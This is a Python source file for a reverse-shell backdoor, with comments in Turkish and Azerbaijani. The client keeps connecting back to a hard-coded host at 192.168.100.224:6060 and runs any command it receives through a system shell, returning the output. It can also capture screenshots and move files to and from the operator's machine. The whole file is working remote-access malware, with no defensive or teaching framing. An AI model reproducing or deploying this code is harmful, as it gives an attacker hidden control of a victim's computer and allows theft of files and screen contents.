import socket
import time
import subprocess
import json
import os
import pyscreenshot

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue
def screenshot():
    tamekran_ss = pyscreenshot.grab()

    # Belgeseler klasörünün yolunu elde et
    documents_path = os.path.expanduser("~/Documents")

    # Dosya adını belirle
    file_name = "last.png"

    # Tam dosya yolu
    full_file_path = os.path.join(documents_path, file_name)

    # Ekran görüntüsünü kaydet
    tamekran_ss.save(full_file_path)
 
def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.100.224',6060))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()


def shell():
      while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'screenshot':
            screenshot()
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)#shell=True commandin terminalda calismasini sagliyir
            result = execute.stdout.read() + execute.stderr.read()#execute terefinden calistirilan commandin standartout nu ve standarterr oxunur ve resulta esitlenir
            result = result.decode()#bu sayede command metin olaraq gosterilir
            reliable_send(result)#elde edilen commandi reliable_send func ile hedefe gonderilir

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
